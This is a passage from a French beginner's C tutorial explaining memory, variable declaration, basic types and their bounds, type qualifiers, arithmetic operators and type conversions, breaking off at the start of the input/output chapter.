mémoires pour stocker tout un tas de données de différentes tailles. Mais pourquoi plusieurs mémoires et pas une seule ? Le fait est que si l'on souhaitait utiliser une seule grosse mémoire dans notre ordinateur, celle-ci serait donc fatalement très lente : il est impossible de créer des mémoires qui soient à la fois rapides et qui puissent contenir beaucoup de données. On ne peut donc utiliser une seule grosse mémoire capable de stocker toutes les données dont on a besoin. Ce problème s'est posé dès les débuts de l'informatique. Les inventeurs des premiers ordinateurs modernes furent rapidement confrontés à ce problème. Pour ceux qui ne me croient pas, regardez un peu cette citation des années 1940, provenant d'un rapport de recherche portant sur un des premiers ordinateurs existant au monde : Idéalement, nous désirerions une mémoire d'une capacité indéfiniment large telle que n'importe quelle donnée soit immédiatement accessible. Nous sommes forcés de reconnaître la possibilité de la construction d'une hiérarchie de mémoire, chacune ayant une capacité plus importante que la précédente, mais accessible moins rapidement. Burks, Goldstine, et Von Neumann Comme on le voit, cette citation (traduite de l'anglais) montre le problème, mais évoque aussi la solution adoptée face à ce problème. Pour résoudre ce problème, il suffit de segmenter la mémoire de l'ordinateur en plusieurs sous-mémoires, de taille et de vitesse différentes qu'on utilise suivant les besoins . On aura donc des mémoires pouvant contenir peu de données dans lesquelles on pourra lire et écrire rapidement et des mémoires plus importantes, mais plus lentes. Cette solution a été la première solution inventée pour résoudre ce problème et est encore massivement utilisée à l'heure actuelle : on n'a pas encore fait mieux ! Nous avons dit que l'ordinateur utilisait plusieurs mémoires. Et il faut savoir que trois de ces mémoires sont importantes, et doivent être connues de tout programmeur. Je vous présente donc : les registres ; la RAM ; le disque dur Alors évidemment, ce ne sont pas les seules : on pourrait aussi citer la mémoire cache et d'autres encore, mais cela n'a rien à faire dans un tutoriel sur le C. Les registres sont des mémoires intégrées dans notre processeur. Elles sont très rapides, mais ne peuvent contenir que des données très simples : on peut difficilement mettre plus qu'un nombre dedans. Leur utilité est de stocker des données temporaires afin d'y accéder plus rapidement. La mémoire RAM est une mémoire un peu plus grosse, et plus lente que les registres. Elle peut contenir pas mal de données, et on l'utilise généralement pour stocker le programme qu'on vient de lancer, ainsi que les données qu'il va manipuler. Cette mémoire a tout de même un léger défaut : elle perd son contenu quand on coupe le courant. Autant dire qu'on doit trouver une autre mémoire pour stocker notre système d'exploitation, nos programmes, etc. : c'est le rôle du disque dur , une mémoire très grosse, mais très lente. En C, la mémoire la plus utilisée est la mémoire vive. Et donc, pour bien comprendre comment programmer en C, il faudra comprendre comment interagir avec cette mémoire RAM. Plus loin dans ce cours, nous verrons également comment manipuler des fichiers sur le disque dur. Mais pour ce qui est des registres, c'est autre chose : le C cache presque totalement la gestion de ceux-ci, qui est réalisée presque entièrement par le compilateur. Impossible de les manipuler directement ! La RAM Hé, une minute : si je stocke une donnée dans ma mémoire, comment je fais pour la récupérer ? Eh bien dans ce cas-là, vous n'avez pas trop le choix : vous devez savoir où se trouve votre donnée dans la mémoire de l'ordinateur. Généralement, cette donnée se trouvera en mémoire RAM. On peut bien sûr copier notre donnée dans un registre, ou sur le disque dur, mais passons. Et pour retrouver notre donnée en RAM, rien de plus simple. Bytes et octets Dans notre RAM, les bits sont regroupés en « paquets » contenant une quantité fixe de bits : des « cases mémoires », aussi appelées bytes . Généralement, nos mémoires utilisent des bytes de 8 bits. Autrefois, certaines mémoires avaient des bytes de 6 ou 5 bits, parfois plus. Mais maintenant, la situation s'est un peu normalisée et la grande majorité des mémoires utilisent des bytes de 8 bits. Un groupe de 8 bits s'appelle un octet . Avec un octet, on peut stocker 256 informations différentes. Par exemple, on peut stocker 256 nombres différents. On peut stocker les lettres de l'alphabet, ainsi que les symboles alphanumériques. On peut aussi stocker tous les nombres de 0 à 255, ou de -128 à 127, tout dépend de comment on s'y prend. Pour stocker plus d'informations (par exemple les nombres de -1024 à 1023), on peut utiliser plusieurs octets, et répartir nos informations dedans. Nos données peuvent prendre un ou plusieurs octets qui se suivent en mémoire, sans que cela pose problème : nos mémoires et nos processeurs sont conçus pour gérer ce genre de situations facilement. En effet, nos processeurs peuvent parfaitement aller lire 1, 2, 3, 4, etc. octets consécutifs d'un seul coup sans problème, et les manipuler en une seule fois. Adresse mémoire Chacun de ces octets se voit attribuer un nombre unique, l'adresse , qui va permettre de la sélectionner et de l'identifier celle-ci parmi toutes les autres. Il faut imaginer la mémoire RAM de l'ordinateur comme une immense armoire, qui contiendrait beaucoup de tiroirs (les cases mémoires) pouvant chacun contenir un octet. Chaque tiroir se voit attribuer un numéro pour le reconnaitre parmi tous les autres. On pourra ainsi dire : je veux le contenu du tiroir numéro 27 ! Pour la mémoire c'est pareil. Chaque case mémoire a un numéro : son adresse. Adresse Contenu mémoire 0 11101010 1 01111111 2 00000000 3 01010101 4 10101010 5 00000000 En fait, on peut comparer une adresse à un numéro de téléphone (ou à une adresse d'appartement) : chacun de vos correspondants a un numéro de téléphone et vous savez que pour appeler telle personne, vous devez composer tel numéro. Les adresses mémoires fonctionnent exactement de la même façon ! Références Pour retrouver votre donnée dans la RAM, on doit donc simplement préciser son adresse. Ce principe peut se généraliser aux autres mémoires : on doit fournir ce qu'on appelle une référence , qui permet d'identifier la localisation de notre donnée dans la mémoire : dans quel registre elle est (l'« adresse » du registre est alors ce qu'on appelle un nom de registre), à quel endroit sur le disque dur, etc. Ainsi, toute donnée est identifiée dans notre ordinateur par une référence, qui permet d'accéder à notre donnée plus ou moins directement. Notre adresse n'est donc qu'un cas particulier de référence, cette notion étant plus générale. Manipuler nos données se fait alors via des références, plus ou moins compliquées, qui peuvent permettre de calculer l'adresse de notre donnée, et déterminer si elle est dans un registre, la RAM, le disque dur, etc. Variables Le seul problème, c'est que manipuler explicitement des références est un vrai calvaire. Si vous ne me croyez pas, essayez de programmer en assembleur, le seul langage dans lequel on doit manipuler des références explicitement. C'est une horreur. Mais rassurez-vous : on a moyen de se passer de ce genre de choses. Pour ce faire, on peut décider de camoufler ces références plus ou moins efficacement. Pour cela, on peut décider de remplacer ces références par autre chose. Dans nos langages de programmation, et notamment dans le langage C, on remplace des références par des variables. Cette variable correspondra à une portion de mémoire, appelée objet , à laquelle on donnera un nom. Ce nom permettra d'identifier notre variable, tout comme une référence permet d'identifier une portion de mémoire parmi toutes les autres. On va ainsi pouvoir nommer les données qu'on manipule, chacun de ces noms étant remplacés par le compilateur en référence vers un registre ou vers une adresse mémoire. Déclarer une variable Entrons maintenant dans le vif du sujet en apprenant à déclarer nos variables. Pour bien commencer, il faut savoir qu'une variable est constituée de deux éléments obligatoires. Un identificateur : c'est en gros le « nom » de la variable. Un type . Le type d'une variable permet d'indiquer ce que l'on veut stocker : un nombre entier, un nombre à virgule (on dit aussi un flottant ), un caractère, etc. Pour préciser le type d'une variable, on doit utiliser un mot-clé, spécifique au type que l'on souhaite donner à notre variable. Une fois qu'on a décidé le nom de notre variable, ainsi que son type, on peut la créer (on dit aussi la déclarer) comme ceci : type identificateur; En clair, il suffit de placer un mot-clé indiquant le type de la variable, et de placer le nom qu'on lui a choisi immédiatement après. Faites bien attention au point-virgule à la fin ! Les types Comme dit précédemment, un type permet d'indiquer au compilateur quel type de données on veut stocker. Ce type va permettre de préciser : toutes les valeurs que peut prendre la variable ; et les opérations qu'on peut effectuer dessus, histoire de ne pas additionner une lettre avec un nombre à virgule. Définir le type d'une variable permet donc de préciser son contenu potentiel et ce qu'on peut faire avec. Le langage C fournit 8 types de base : Type Sert à stocker char un caractère ou un entier short un entier int un entier long un entier float un flottant double un flottant long double un flottant Les types short , int et long servent tous à stocker des nombres entiers qui peuvent prendre des valeurs positives, négatives, ou nulles. On dit qu'il s'agit de types signés. Pour ces trois types, il existe un type équivalent non signé. Un type entier non signé est un type entier qui n'accepte que des valeurs positives ou nulles : il ne peut pas stocker de valeurs négatives. Pour déclarer des variables d'un type non signé, il vous suffit de faire précéder le nom du type entier du mot-clé unsigned . Le char peut lui aussi servir à stocker des nombres. Il sert surtout au stockage de caractères, mais ces derniers étant stockés dans l'ordinateur sous forme de nombres, il est possible de stocker des nombres dans un char . Le seul problème, c'est que ce char peut très bien être signé sur certains compilateurs et pas sur d'autres. Suivant le compilateur utilisé, le char sera soit signé par défaut, soit il sera non signé. Pour éviter les ennuis en utilisant un char comme un nombre, vous pouvez les déclarer explicitement non signés : unsigned char ou signés : signed char . Capacité d'un type Tous les types stockant des nombres (tous sauf le type char ) ont des bornes, c'est-à-dire une limite aux nombres qu'ils peuvent stocker. Il faut dire que le nombre de bytes occupé par une variable d'un certain type est limité, et est généralement fixé définitivement pour toutes les variables de ce type par le compilateur. En conséquence, on ne peut pas mettre tous les nombres possibles dans une variable de type int , float , ou double . On aura forcément une valeur minimale et une valeur maximale : certains nombres seront trop grands ou trop petits pour rentrer dans une variable d'un certain type. Ces bornes (que vous pouvez trouver au paragraphe 2.2.4.2 de la norme) sont les suivantes : Type Minimum Maximum signed char -127 127 unsigned char 0 255 short -32 767 32 767 unsigned short 0 65 535 int -32 767 32 767 unsigned int 0 65 535 long -2 147 483 647 2 147 483 647 unsigned long 0 4 294 967 295 float $-1 × 10&#94; $+1 × 10&#94; double $-1 × 10&#94; $+1 × 10&#94; long double $-1 × 10&#94; $+1 × 10&#94; Si l'on regarde bien le tableau, on remarque que certains types ont des bornes identiques. En vérité, les valeurs présentées ci-dessus sont les minima garantis par la norme et il est fort probable qu'en réalité, vous puissiez stocker des valeurs plus élevées que celles-ci (le type int s'apparente souvent à un long , par exemple). Cependant, dans une optique de portabilité, vous devez considérer ces valeurs comme les minima et les maxima de ces types, peu importe la capacité réelle de ces derniers sur votre machine. Information : le type unsigned int équivaut à un unsigned , ne soyez pas surpris si plus tard en lisant les codes d'autrui vous ne trouveriez seulement ce mot-clé. Taille d'un type Peut-être vous êtes vous demandés pourquoi existe t-il autant de types différents. La réponse est toute simple : la taille des mémoires était très limitée à l'époque où le langage C a été créé. En effet, le PDP-11 sur lequel le C a été conçu ne possédait que 24 Ko de mémoire (pour comparaison une calculatrice TI-Nspire possède 100 Mo de mémoire, soit environ 4000 fois plus). Il fallait donc l'économiser au maximum en choisissant le type le plus petit possible. Cette taille dépend des machines, mais de manière générale vous pouvez retenir les deux suites d'inégalités suivantes : char ≤ short ≤ int ≤ long et float ≤ double ≤ long double . Aujourd'hui ce n'est plus un problème, il n'est pas nécessaire de se casser la tête sur quel type choisir (excepté si vous voulez programmer pour de petits appareils où la mémoire est plus petite). En pratique, on utilisera surtout char pour les caractères, int pour les entiers et double pour les flottants. Les autres types ne servent pas à grand-chose. Les identificateurs Maintenant que l'on a vu les types, parlons des identificateurs. Comme dit précédemment, un identificateur est un nom donné à une variable pour la différencier de toutes les autres. Et ce nom, c'est au programmeur de le choisir. Cependant, il y a quelques limitations à ce choix. On ne peut utiliser que les 26 lettres de l'alphabet latin (majuscules ou minuscules) : pas d'accents, pas de ponctuation ni d'espaces. Le caractère underscore (« _ ») et les chiffres sont cependant acceptés. Un identificateur ne peut pas commencer par un chiffre. Les mots-clés ne peuvent pas servir à identifier une variable ; on ne peut donc pas utiliser ces mots : auto break case char const continue default do double else enum extern float for goto if int long register return short signed sizeof static struct switch typedef union unsigned void volatile while Pour simplifier, on peut parfaitement considérer que deux variables ne peuvent avoir le même identificateur (le même nom). Il y a parfois quelques exceptions, mais cela n'est pas pour tout de suite. Les identificateurs peuvent être aussi longs que l'on désire, toutefois le compilateur ne tiendra compte que des 32 premiers caractères. Voici quelques exemples pour bien comprendre : Identificateur correct Identificateur incorrect Raison variable Nom de variable Espaces interdits nombre_de_vie 1nombre_de_vie Commence par un chiffre test test! Caractère « ! » interdit un_dernier_pour_la_route1 continue Mot-clé réservé par le langage À noter que le C fait la différence entre les majuscules et les minuscules (on dit qu' il respecte la casse ). Ainsi les trois identificateurs suivants sont différents. variable Variable VaRiAbLe D'autres mots-clés En plus des mots-clés qui servent à indiquer le type de notre variable, on peut utiliser d'autres mots-clés lors de la déclaration de nos variables. Le but : donner un peu plus d'informations sur nos variables. On peut ainsi préciser que l'on veut que nos variables soient constantes et non modifiables, ou d'autres choses encore. On ne va pas voir tous les mots-clés existants, et pour cause : il nous manque quelques informations pour vous expliquer le rôle de certains. Nous allons seulement parler des mots-clés const , volatile et register . Comme vous l'avez surement deviné, ces mots-clés se placent avant le type et le nom de la variable, lors de la déclaration. const Le premier que je vais vous montrer est const . Ce mot-clé signifie « constant » en français. Il sert donc à déclarer une variable comme étant constante, c'est-à-dire qu'on ne pourra pas modifier sa valeur au cours du programme. Sa valeur restera donc inchangée durant toute l'exécution du programme. À quoi ça sert ? C'est utile pour stocker une variable qui ne changera jamais, comme la constante $\\pi$ qui vaudra toujours 3,14159265 ou $e$ qui vaudra toujours 2,718281828. Une recommandation qui est souvent faite est de déclarer comme étant const tout ce qui est possible. Cela permet d'éviter pas mal d'erreurs et aide à éclaircir le code. Par convention, une variable constante est souvent écrite en majuscule. Voir une variable constante en minuscule peut paraître étrange pour certains. De plus, il est extrêmement horripilant de voir des variables non constantes en majuscules ! register Vient ensuite register . Celui-ci permet de dire au compilateur que l'on veut que notre variable soit stockée de préférence dans un registre du processeur, au lieu de devoir être placée en mémoire RAM. C'est en effet le compilateur qui décide quelle variable stocker dans les registres, durant combien de temps, et à quel moment. On dit qu'ils se chargent d'allouer les registres. register permettait autrefois d'indiquer au compilateur que la variable désignée register était à placer (ou à copier) dans les registres dès que possible. L'utilité de register est très simple : un registre est au bas mot plus de 100 à 200 fois plus rapide que la mémoire RAM de notre ordinateur. Ainsi, placer (ou copier) une variable dans les registres permet d'accéder à celle-ci bien plus rapidement que si on devait la lire ou l'écrire depuis la mémoire RAM. Idéalement, on voudrait donc mettre toutes nos variables dans ces registres. Mais le problème, c'est que notre processeur ne possède que peu de registres. Il n'est ainsi pas rare d'avoir à se débrouiller avec seulement 4 à 8 registres. Autant dire qu'il faut alors réfléchir consciencieusement aux variables à placer dedans : il faut mettre de préférence des variables auxquelles on va accéder souvent (et ne pas hésiter à déplacer des variables entre registres et mémoire si besoin est). register permettait de préciser quelles étaient les variables à mettre en priorité dans les registres, histoire d'orienter le choix du compilateur. Cela permettait alors de rendre nos programmes plus rapides. Mais c'était il y a longtemps : de nos jours, register ne sert plus à rien (ou presque). La raison est très simple : les compilateurs actuels disposent d'algorithmes mathématiques qui permettent de gérer les registres de façon quasi optimale. En tout cas, nos compilateurs se débrouillent nettement mieux que les programmeurs pour décider quel registre utiliser et quelles données placer dedans. Ils n'ont donc plus besoin d'aide, et register est souvent ignoré ou sous-utilisé par ces compilateurs. En clair : register est une antiquité, qui ne doit plus être utilisé, et ne sert strictement à rien. Après, libre à vous de tenter de l'utiliser, mais au moins, vous savez d'avance que c'est inutile. volatile Le dernier est moins connu, car moins utilisé : il s'agit de volatile . C'est un peu l'inverse de register . Une variable marquée volatile ne peut pas être copiée ou placée dans les registres du processeur. volatile sert dans certains cas bien particuliers, que vous ne rencontrerez surement jamais. Il arrive qu'une variable soit modifiée par autre chose que le programme dans lequel on a déclaré cette variable. Par exemple, certaines variables peuvent être modifiées par des périphériques, comme la souris, le clavier, etc. Ou encore, on peut avoir à manipuler des variables accessibles par plusieurs programmes, qui peuvent être mises à jour à n'importe quel moment. Ces modifications de la variable se feront alors en mémoire RAM : il est en effet impossible pour un périphérique ou un programme d'aller modifier le contenu d'un registre déjà attribué à un autre programme. Si on stocke notre variable dans un registre, les mises à jour effectuées en mémoire RAM ne seront pas répercutées sur la copie de la variable stockée dans les registres. Le programme qui aura stocké cette variable dans ses registres continuera donc de manipuler une variable périmée, non mise à jour. Cela peut donner lieu à des bugs relativement bizarres ou catastrophiques. Pour éviter toute catastrophe, ces variables spéciales doivent donc être marquées volatile , histoire de ne pas pouvoir être placées dans les registres du processeur, et lues ou écrites en mémoire RAM. Je tiens à préciser que volatile n'est toutefois utile que pour certaines variables, potentiellement accessibles par autre chose que le programme qui l'a déclaré (un autre programme, un périphérique, etc.), et qui peuvent être modifiées n'importe quand. Ce genre de cas est très rare, et n'arrive que quand on doit travailler avec du matériel très spécial, ou qu'on veut créer des programmes très compliqués, qui manipulent directement le matériel, comme des pilotes de périphériques des systèmes d'exploitation, etc. Autant être franc, vous n'aurez certainement jamais à utiliser volatile dans un programme, tellement ce genre de cas est rare et particulier. Mais un peu de culture générale ne fait jamais de mal, et peut être utile au cas où. Déclaration et initialisation Maintenant que nous savons toutes les bases, entrainons-nous à déclarer quelques variables : double taille ; volatile unsigned int age ; char caractere ; short petite_valeur ; On peut aussi déclarer plusieurs variables de même type sur une même ligne, en séparant leurs noms par une virgule : int age , taille , nombre ; Je vous conseille d'utiliser les deux méthodes de déclaration que vous venez de voir (multiligne et monoligne) simultanément, comme ceci : int annee , mois , jour ; int age , taille ; int x , y , z ; J'ai regroupé les déclarations de variables selon les « rapports » qu'ils ont entre eux. Je vous présente du code, des explications, encore du code puis encore des explications. Mais durant tout ce temps, vous avez peut-être essayé de compiler ces codes. Êtes-vous surpris de voir qu'il ne se passe rien ? Les plus malins d'entre vous auront peut-être compris qu'il ne se passe rien en apparence. Je dis bien en apparence car, en réalité, l'ordinateur fait parfaitement son travail : il va réserver des cases mémoire pour nos variables. Votre ordinateur fait donc tout ce que vous lui demandez de faire : déclarer des variables, et non modifier leurs valeurs et encore moins les afficher ! Alors OK, notre case mémoire est réservée pour notre variable, mais quelle est la valeur qu'il y a dedans (quel est l'objet dans le tiroir) ? Eh bien en fait, c'est indéterminé. Il peut y avoir n'importe quelle valeur (n'importe quel objet dans le tiroir). Initialisation Mais heureusement, on peut donner une valeur à une variable dès sa déclaration. On dit aussi qu'on initialise notre variable. Ainsi on est sûr que la case mémoire ne contient pas n'importe quoi. Pour initialiser une variable, on procède ainsi si c'est une variable destinée à contenir une valeur numérique : type identificateur = valeur; Ou comme ceci si c'est un caractère : char identificateur = 'lettre'; Voici quelques exemples de déclarations de variables : volatile unsigned int age = 25 ; short petite_valeur = 1 ; const long abc = 3141596 ; char caractere = 'h' ; Petite note sur const : il faut donner une valeur à la variable dès la déclaration puisque l'on ne pourra plus la modifier après ! Petite précision : la norme C89 réclame que l'on sépare les déclarations du reste du code : on ne peut pas déclarer une variable où l'on veut. Si l'on veut vraiment suivre la norme, on déclare d'abord toutes les variables en début de bloc (c'est-à-dire après une accolade ouvrante) et ensuite vient le reste des instructions. Initialisation des nombres flottants Je tiens à retenir votre attention sur la manière d'initialiser les variables flottantes (soit donc de type float ou double ). En fait, ces variables sont faites pour contenir des nombres à virgule. À l'initialisation, il ne faut donc pas se contenter de donner sa valeur, il faut aussi mettre la « virgule ». Sauf que l'on ne met pas une virgule : on met un point. const double pi = 3.14 ; Cela vient du fait que le C est une invention américaine, et que les anglophones utilisent le point à la place de la virgule, on met un point là où nous autres francophones mettons une virgule. Et vous devez impérativement mettre ce point, même si vous voulez stocker un nombre entier dans un float ou un double . Par exemple, vous ne devez pas écrire double a = 5; mais double a = 5.; (certains préfère double a = 5.0; , cela revient au même). Si vous ne le faites pas, vous risquez d'avoir quelques problèmes. Voici un petit tableau récapitulatif afin de bien comprendre : Type Initialisation char 0 ou '\\0' short 0 int 0 long 0 float 0. double 0. long double 0. Affectation Nous savons donc déclarer (créer) nos variables, et les initialiser (leur donner une valeur à la création). Il ne nous reste plus qu'à voir la dernière manipulation possible : l'affectation . Cette affectation permet de modifier la valeur contenue dans une variable, pour la remplacer par une autre valeur. Il va de soi que cette affectation n'est possible que pour les variables qui ne sont déclarées avec const : par définition, de telles variables sont en effet constantes et ne peuvent voir leur contenu changer. Cela interdit toute affectation pour ces variables déclarées constantes. Pour faire une affectation, il suffit d'opérer ainsi : identificateur = nouvelle_valeur; On voit que la syntaxe est similaire à celle d'une déclaration avec initialisation : la seule différence, c'est qu'on n'a pas à préciser le type. Ce type est en effet fixé une fois pour toutes lors de la déclaration de notre variable : pas besoin de le préciser lors d'une affectation. Si je veux changer la valeur de mes variables, je procède tout simplement comme suit. age = 30 ; taille = 177.5 ; petite_valeur = 2 ; Il n'y a aucune limite, voyez par exemple : petite_valeur = 2 ; petite_valeur = 4 ; petite_valeur = 8 ; petite_valeur = 16 ; petite_valeur = 8 ; petite_valeur = 4 ; petite_valeur = 2 ; À chaque affectation, la variable va prendre une nouvelle valeur. Par contre, ne mettez pas le type quand vous voulez changer la valeur, sinon vous aurez le droit à une belle erreur du type « redefinition of 'nom_de_votre_variable' » car vous aurez créé deux variables avec le même identificateur ! Le code suivant est donc incorrect : int age = 15 ; int age = 20 ; Si vous exécutez tous ces codes, vous verrez qu'ils n'affichent toujours rien. Mais pourquoi ? Tout simplement parce qu'on n'a pas demandé à notre ordinateur d'afficher quoique ce soit. Et ce n'est pas pour tout de suite : on apprendra comment faire pour afficher quelque chose sur la console au chapitre suivant. Quoiqu'il en soit, ne soyez pas pressés et prenez bien le temps d'assimiler toutes les notions présentées dans ce chapitre. Utiliser des variables Nous savons désormais déclarer, affecter et initialiser une variable, mais que diriez-vous d'apprendre à réaliser des opérations dessus ? Il est en effet possible de réaliser des calculs sur nos variables, comme les additionner, les diviser voire même des opérations plus complexes. C'est le but de cette sous-partie. Nous allons donc enfin transformer notre ordinateur en grosse calculette programmable ! Cette partie est importante, donc même si vous détestez les mathématiques, vous devez la lire. Calculs de base Le langage C fournit 5 opérations de base sur nos variables. ​ L'addition + . La soustraction - . La multiplication * . * La division / . * Le modulo % * (le reste d'une division euclidienne). Le langage C fournit aussi d'autres fonctions mathématiques préprogrammées, mais qu'on ne peut pas encore utiliser à ce stade. Nous devrons donc reporter à plus tard l'utilisation de fonctions mathématiques plus complexes. Si jamais vous devez utiliser une fonction mathématique plus complexe, il faudra la programmer, pour le moment. Commençons par détailler ces 5 opérations de base. Addition, soustraction et multiplication C'est tout simple : pour faire notre calcul, il suffit d'assigner le résultat du calcul à une variable : int somme , difference , produit ; somme = 2 + 3 ; /* 5 */ difference = 8 - 12 ; /* -4 */ produit = 6 * 7 ; /* 42 */ On pourrait multiplier les exemples à l'infini, je pense néanmoins que vous avez compris le concept. Division La division en informatique est différente de celle en mathématiques. Si je vous dis $\\frac{15}{4}$, vous en déduisez que le quotient est 3,75. Pourtant, le résultat de celle-ci est 3 en langage C. int division = 15 / 4 ; Suite à la lecture du chapitre suivant, vous pourrez vérifier cette affirmation en affichant la valeur de cette opération, mais vous n'en êtes pas encore là, et je vous défends de vous y rendre avant la fin de ce chapitre. Pour l'ordinateur, le résultat de 15 / 4 est bien 3 . Pourquoi ? Parce qu'on lui a demandé de faire une division d'entiers (appelée division euclidienne ), donc il répond par des entiers. Si l'on veut afficher le résultat complet (à nos yeux), il faut l'indiquer à l'ordinateur. Comment faire ? Essayez de trouver la solution tout seul. Un indice ? Pensez aux flottants. La solution : double division = 15. / 4. ; /* même si pour nous, c'est la même chose que 15 / 4 */ Même si pour nous c'est intuitif, pour l'ordinateur il faut bien préciser si ce sont des entiers ou des flottants. Modulo Le modulo est un peu le complément de la division puisqu'il permet de connaitre le reste d'une division euclidienne. C'est une opération de base aux yeux de l'ordinateur, même si elle est assez peu connue. Un petit code pour la route : int modulo = 11 % 4 ; Ici, le résultat de cette instruction est 3, car $11 = 2 \\times 4 + 3$. Le modulo est la réponse au problème de la division d'entiers. Opérations entre variables Le principe est tout simple : au lieu d'opérer sur des nombres, on opère sur des variables. Ainsi on peut faire les mêmes opérations sur des variables : var = var1 + var2 ; d = c / b * a ; On peut ainsi rajouter autant de variables que l'on veut, et même mélanger avec des nombres : d = c / b * a - s + 7 % 2 Cependant, il faut faire attention à la priorité des opérateurs : comme en mathématiques, certains opérateurs passent avant d'autres : * / % ont une priorité supérieure à + - . Dans ce code : x = nombre + y * 4 ; C'est y * 4 qui sera exécuté d'abord, puis on ajoutera nombre au résultat. Faites donc attention, sous peine d'avoir de mauvaises surprises. Dans le doute, mettez des parenthèses. Les raccourcis Comment vous y prendriez-vous pour multiplier une variable par trois ? La solution « naïve » serait de faire : variable = variable * 3 ; Cependant, c'est long, fatigant, et peut vite devenir fastidieux si l'on fait beaucoup d'opérations de ce genre. On a donc inventé des techniques permettant de raccourcir notre code : les raccourcis . Ces raccourcis fonctionnent pour toutes les opérations arithmétiques de base. Ainsi, pour faire la même opération que le code précédent, on peut raccourcir ainsi : variable *= 3 ; Ce code concis marche exactement comme le précédent. Et le principe est valable pour toutes les opérations, pour n'importe quelle valeur : variable += 2 ; variable -= 9 ; variable /= 8 ; variable %= 4 ; Cependant, il existe encore deux autres raccourcis très fréquemment utilisés. Incrémentation et décrémentation Ce sont deux opérations qui, respectivement, ajoute ou enlève 1 à une variable. On pourrait utiliser les raccourcis vus juste avant : variable += 1 ; variable -= 1 ; Cependant, on a inventé de nouveaux raccourcis pour ces deux opérations, car elles sont très utilisées (vous comprendrez vite pourquoi dans les prochains chapitres). Ces deux raccourcis sont les suivants : variable ++ ; Pour l' incrémentation (on ajoute 1) et : variable -- ; pour la décrémentation (on enlève 1). Ces deux lignes sont parfaitement équivalentes aux deux premières. Elles permettent simplement de raccourcir le code. Ce que je viens de vous montrer s'appelle l'[in/dé]crémentation postfixée . En effet, il est aussi possible de faire une [in/dé]crémentation pré-fixée : le signe est alors avant la variable et non après : ++ variable ; -- variable ; Il y a une subtile différence entre les deux formes. Une [in/dé]crémentation pré-fixée change la valeur de l'expression avant d'envoyer la valeur, alors qu'une [in/dé]crémentation post-fixée renvoie la valeur et la modifie ensuite. Petit exemple pour bien comprendre : si j'ai une variable a qui vaut 5, ++a incrémentera immédiatement la variable a, qui vaudra alors 6. int a = 5 ; int b = ++ a ; /* ici, b vaudra 6 */ Par contre, a++ attendra avant d'incrémenter la variable : celle-ci sera incrémentée après la prochaine \"utilisation\". int a = 5 ; int b = a ++ ; /* ici, b vaudra 5, et a sera mit à 6 une fois que la valeur de a++ est recopiée dans b */ Fondamentalement, utiliser l'une ou l'autre des deux formes ne change pas grand chose, sauf dans quelques cas particuliers. Dans la plupart des cas, les programmeurs utilisent la forme postfixée ( i++ ) en permanence. Il n'y a pas vraiment de raisons valables pour faire cela à l'heure actuelle, mais cette pratique est monnaie courante. Aussi, ne soyez pas étonné de voir des codes utilisant la forme post-fixée alors qu'une forme préfixée aurait été plus adéquate. Les conversions de type La conversion de type est une opération qui consiste à changer le type d'une variable en un autre. Je peux ainsi convertir une variable de type float en type int , par exemple. Il existe deux types de conversions : les conversions explicites et les conversions implicites . Les conversions explicites Ce sont des conversions voulues et demandées par le programmeur. Elles se déclarent en suivant ce modèle : (<Type>) <Expression> Voici par exemple un code où l'on demande explicitement la conversion d'un double en int . int a ; const double pi = 3.14 ; a = ( int ) pi ; La valeur de pi reste inchangée, elle vaudra toujours 3.14 dans la suite du programme. Par contre, a vaut maintenant 3, puisque le flottant a été converti en entier. Expliciter une conversion peut nous servir quand on veut forcer le résultat d'une opération par exemple. Imaginons que nous voulons faire une division, mais que les deux opérandes soient de type int . int a , b ; double c ; a = 5 ; b = 9 ; c = a / b ; Vu qu'on fait une division euclidienne, le résultat sera tronqué. Si on veut avoir un résultat avec la partie décimale, il suffit de faire une conversion explicite d'un des deux opérandes en double : c = ( double ) a / b ; /* ou */ c = a / ( double ) b ; Les conversions implicites Ce sont des conversions que fait le compilateur tout seul, sans que l'on ait demandé quoi que ce soit. En général, ça ne gêne pas le programmeur, mais ça peut parfois être problématique si la conversion n'était pas voulue. Par exemple, si l'on reprend le code précédent, il y aura toujours une conversion. int a ; const double pi = 3.14 ; /* Il y a conversion implicite de double en int, mais rien n'est précisé, c'est le compilateur qui fait ça de lui-même. */ a = pi ; Cependant, les conversions amènent parfois à des pertes d'information si l'on n'y prend pas garde. Perte d'information Une perte d'information survient quand on convertit le type d'une variable en un autre type plus petit et que celui-ci ne peut pas contenir la valeur reçue. Si, par exemple, je convertis un double de 100 chiffres en un short , il y a perte d'information, car le type short ne peut pas contenir 100 chiffres. La règle à retenir est la suivante : Si on convertit un type T vers un type S plus petit, il y a perte d'information. -- Règle des conversions Les conversions, et surtout les conversions implicites qui peuvent être vicieuses, doivent être manipulées avec précaution, au risque de tomber sur des valeurs fausses en cas de perte d'information. Nous découvrirons d'ici quelques chapitres comment connaitre la taille d'un type T pour éviter ces pertes d'information. Voilà, c'est la fin de ce chapitre. On a déjà vu beaucoup de choses, n'hésitez pas à potasser pour bien assimiler tout ça. Les variables sont vraiment la base de la programmation, il faut bien les comprendre. Rendez-vous au prochain chapitre qui sera très intéressant : vous pourrez par exemple demander l'âge de l'utilisateur pour ensuite l'afficher ! Manipulations basiques des entrées/sorties Durant l'exécution d'un programme, le processeur, qui est le cerveau de l'ordinateur, a besoin de communiquer avec le reste du matériel. Il doit en effet recevoir des informations pour réaliser des actions et il doit aussi en transmettre. Ces échanges d'informations sont les entrées et les sorties (ou input / output pour les anglophones), souvent abrégée E/S (ou I/O par les anglophones). Les entrées permettent de recevoir une donnée en provenance de certains périphériques. Les données fournies par ces entrées peuvent être une information envoyée par le disque dur, la carte réseau, le clavier, la souris, un CD, un écran tactile, bref par n'importe quel périphérique.Par exemple, notre clavier va transmettre des informations sur les touches appuyées (par exemple 1 et 8 ) au processeur ou à la mémoire : notre clavier est donc une entrée. À l'inverse, les sorties vont transmettre des données vers ces périphériques. On pourrait citer l'exemple de l'écran : notre ordinateur lui envoie des informations pour qu'elles soient affichées. Dans ce chapitre, nous allons apprendre différentes fonctions fournies par le langage C, qui vont nous permettre de recevoir ou d'envoyer des informations sur nos sorties et d'en recevoir sur nos entrées. Vous saurez ainsi comment demander à un utilisateur de rentrer une information au clavier, et comment afficher quelque chose sur la console. Les sorties Intéressons-nous dans un premier temps aux sorties. Afin d'afficher un caractère ou même un texte (on préfère le terme de « chaîne de caractères ») à l'écran, il faut utiliser des fonctions . Depuis votre premier code, vous en utilisez une : la fonction main . Une fonction, en simplifiant un peu, est un morceau de code exécutant des instructions. Des instructions qui permettent d'effectuer des opérations (avec 